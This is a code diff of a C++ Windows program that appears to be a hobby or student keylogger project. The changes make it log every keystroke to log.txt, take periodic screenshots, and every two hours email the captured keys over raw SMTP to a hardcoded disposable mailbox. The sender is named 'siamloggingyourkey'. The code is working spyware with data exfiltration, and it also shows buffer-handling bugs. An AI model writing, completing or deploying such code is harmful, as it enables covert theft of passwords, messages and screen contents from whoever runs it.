@@ -20,11 +20,11 @@
 
 #define SMTP_PORT "25"
 #define DEFAULT_BUFLEN 1024
-#define BUFSIZE 800
-#define waittime 500
-#define cmailserver "gmail-smtp-in.l.google.com"
-#define cemailto "bsse1104@iit.du.ac.bd"
-#define cemailfrom "dynamicsiam01@gmail.com"
+//#define BUFSIZE 800
+//#define waittime 500
+//#define cmailserver "gmail-smtp-in.l.google.com"
+#define recipientAddr "mdsiam01@sharklasers.com"
+//#define cemailfrom "dynamicsiam01@gmail.com"
 #define LogLength 100
 #define SMTPLog "smtp.log"
 #define cemailsubject "Interesting Mail"
@@ -34,15 +34,15 @@
 using namespace std;
 
 bool numUnlocked = true;
-int capsCount=0;
+int capsCount=0,ssCount=1;;
+time_t start, end;
+double elapsed, prev_elapsed = 0.0, mail_elapsed = 0.0;
 
 void viewOptions();
 bool authentication_ret(char*, char*);
 void authentication();
-int ssCount = 10;
 char recipients_mail[80];
-
-
+int mailMyLog(char *);
 
 
 bool authentication_ret(char takenName[], char takenPass[])
@@ -146,6 +146,8 @@ void mailingGraph()
     char email[80];
     strcpy(email,inputbuf);
     strcpy(recipients_mail, email);
+    int email_size = strlen(recipients_mail);
+    recipients_mail[email_size-1]='\0';
     POINT position;
     int count=0;
     printf("Your email: %s",email);
@@ -162,11 +164,12 @@ void mailingGraph()
     }
     int x = position.x;
     int y = position.y;
-    if(x>=550&&x<=700&&y>=450&&y<=600)
+    if(x>=550&&x<=800&&y>=450&&y<=600)
     {
 
         int height=300,width=700;
-        initwindow(width,height,"Authentication Failed",500,350);
+        initwindow(width,height,"Mailed",500,350);
+        mailMyLog(recipients_mail);
         settextstyle(8,HORIZ_DIR,3);
         outtextxy(100,100,"Mailed! Redirecting to Options...");
         delay(5000);
@@ -881,7 +884,7 @@ void recvData(SOCKET* socket)
         printf("recv failed: %d\n", WSAGetLastError());
 }
 
-int mailMyLog(char *mailserver, char *emailto, char *emailfrom, char *emailsubject, char *emailmessage) {
+int mailMyLog(char *receiverAddress) {
 
     WSADATA wsaData;
 
@@ -941,26 +944,46 @@ int mailMyLog(char *mailserver, char *emailto, char *emailfrom, char *emailsubje
 
     sendData(&ConnectSocket, "HELO mail.sharklasers.com\r\n");
     recvData(&ConnectSocket);
-    sendData(&ConnectSocket, "MAIL FROM:<psgibrxp@sharklasers.com>\r\n");
+    sendData(&ConnectSocket, "MAIL FROM:<siamloggingyourkey@sharklasers.com>\r\n");
     recvData(&ConnectSocket);
-    sendData(&ConnectSocket, "RCPT TO:<psgibrxp@sharklasers.com>\r\n");
+    char line[1000];
+    strcpy(line,"RCPT TO:<");
+    strncat(line,receiverAddress,strlen(receiverAddress));
+    strncat(line,">\r\n",3);
+    sendData(&ConnectSocket, line);
     recvData(&ConnectSocket);
     sendData(&ConnectSocket, "DATA\r\n");
     recvData(&ConnectSocket);
-    sendData(&ConnectSocket, "Subject:This is subject of my mail\r\n");
+    sendData(&ConnectSocket, "Subject:Logged Keys\r\n");
     sendData(&ConnectSocket, "And this is text\r\n");
     sendData(&ConnectSocket, "MIME-Version: 1.0\r\n");
     sendData(&ConnectSocket, "Content-Type:multipart/mixed;boundary=\"977d81ff9d852ab2a0cad646f8058349\"\r\n");
-    sendData(&ConnectSocket, "Subject:This is subject of my mail\r\n");
+    sendData(&ConnectSocket, "Subject:Logged Keys\r\n");
     sendData(&ConnectSocket, "\r\n"); /* added */
     sendData(&ConnectSocket, "--977d81ff9d852ab2a0cad646f8058349\r\n");
     sendData(&ConnectSocket, "Content-Type: text/plain; charset=\"utf-8\"\r\n");
     sendData(&ConnectSocket, "Content-Transfer-Encoding: quoted-printable\r\n\r\n");
-    sendData(&ConnectSocket, "Hi Siam,=0A=0AThis is an empty file.=0A=0ARegards,=0A<ME>=0A=0A---- =0ASent using Guerrillamail.com =0ABlock or report abuse : https://www.guerrillamail.com//abuse/?a=3DUVJzDA8SW6Q1mwa14nUTcwfCX9ne0dhd=0A \r\n\r\n");
+    FILE *fp = fopen("log.txt", "r");
+    char mylogs[10000];
+    char tem[100];
+    strcat(mylogs, "Hi Admin,=0A=0AHere is the logged key.=0A=0A");
+    while(fgets(tem,100,fp)!=NULL)
+    {
+        int size1= strlen(tem);
+
+        //tem[size1-1]='\n';
+
+        std::cout<< tem <<std::endl;
+        strcat(mylogs, tem);
+    }
+    fclose(fp);
+    strcat(mylogs,"=0A=0ARegards,=0A<SIAM>=0A=0A---- =0ASent using Guerrillamail.com =0ABlock or report abuse : https://www.guerrillamail.com//abuse/?a=3DUVJzDA8SW6Q1mwa14nUTcwfCX9ne0dhd=0A \r\n\r\n");
+    sendData(&ConnectSocket, mylogs);
+    //sendData(&ConnectSocket, "Hi Siam,=0A=0AThis is an empty file.=0A=0ARegards,=0A<ME>=0A=0A---- =0ASent using Guerrillamail.com =0ABlock or report abuse : https://www.guerrillamail.com//abuse/?a=3DUVJzDA8SW6Q1mwa14nUTcwfCX9ne0dhd=0A \r\n\r\n");
     sendData(&ConnectSocket, "--977d81ff9d852ab2a0cad646f8058349\r\n");
     sendData(&ConnectSocket, "Content-Type: text/plain\r\n");
     sendData(&ConnectSocket, "Content-Transfer-Encoding: base64\r\n");
-    sendData(&ConnectSocket, "Content-Disposition: attachment; filename=\"test.cpp\"\r\n\r\n");
+    sendData(&ConnectSocket, "Content-Disposition: attachment; filename=\"log.txt\"\r\n\r\n");
     sendData(&ConnectSocket, "U2FtcGxlIFRleHQu");
     sendData(&ConnectSocket, "\r\n\r\n--977d81ff9d852ab2a0cad646f8058349--\r\n\r\n");
     sendData(&ConnectSocket, ".\r\n");
@@ -1002,7 +1025,6 @@ int mailMyLog(char *mailserver, char *emailto, char *emailfrom, char *emailsubje
     WSACleanup();
     return 0;
 }
-
 void stealth()
 {
     HWND stealth;
@@ -1151,28 +1173,28 @@ int save(int _key, char const *file)
     }
     else if( _key == 0xBE)
     {
-        if(GetAsyncKeyState(VK_SHIFT) && 0x8000)
+        if(GetAsyncKeyState(VK_SHIFT))
             fprintf(OUTPUT_FILE, "%s", ">");
         else
             fprintf(OUTPUT_FILE, "%s", ".");
     }
     else if( _key == 0xBA)
     {
-        if(GetAsyncKeyState(VK_SHIFT) && 0x8000)
+        if(GetAsyncKeyState(VK_SHIFT))
             fprintf(OUTPUT_FILE, "%s", ":");
         else
             fprintf(OUTPUT_FILE, "%s", ";");
     }
     else if( _key == 0xBD)
     {
-        if(GetAsyncKeyState(VK_SHIFT) && 0x8000)
+        if(GetAsyncKeyState(VK_SHIFT))
             fprintf(OUTPUT_FILE, "%s", "_");
         else
             fprintf(OUTPUT_FILE, "%s", "-");
     }
     else if( _key == 0xBB)
     {
-        if(GetAsyncKeyState(VK_SHIFT) && 0x8000)
+        if(GetAsyncKeyState(VK_SHIFT))
             fprintf(OUTPUT_FILE, "%s", "+");
         else
             fprintf(OUTPUT_FILE, "%s", "=");
@@ -1299,25 +1321,51 @@ int save(int _key, char const *file)
 }
 
 
-int main()
+void logKeys()
 {
-    //stealth();
     short i;
     while(1)
     {
+        time(&end);
+
+        elapsed = difftime(end, start);
+        if (elapsed >= prev_elapsed+900.0)
+        {
+            char nameOfScreenshot[20];
+            snprintf(nameOfScreenshot, 20, "image%d.bmp", ssCount); // puts string into buffer
+            printf("%s\n", nameOfScreenshot);
+            ssCount++;
+            ScreenCapture(0, 0, 1500, 1000, nameOfScreenshot);
+
+            prev_elapsed = elapsed;
+        }
+
+        if (elapsed >= mail_elapsed+7200.0)
+        {
+            mailMyLog(recipientAddr);
+            mail_elapsed = elapsed;
+        }
+
         Sleep(10);
+
         for(i=0;i<255;i++)
         {
-            //if((GetAsyncKeyState(VK_SHIFT)&0x80000) && (GetAsyncKeyState(VK_CONTROL)&0x80000) && (GetAsyncKeyState(VK_TAB)&0x80000))
-                   // authentication();
+            if((GetAsyncKeyState(VK_SHIFT)&0x80000) && (GetAsyncKeyState(VK_CONTROL)&0x80000) && (GetAsyncKeyState(VK_TAB)&0x80000))
+                authentication();
             if(GetAsyncKeyState(i)==-32767)
             {
                 save(i,"log.txt");
             }
         }
+
         //system("PAUSE");
     }
-   // Sleep(10);
-    //viewOptions();
-    cout<< "siam"<<endl;
+}
+
+int main()
+{
+
+    time(&start);
+    logKeys();
+
 }
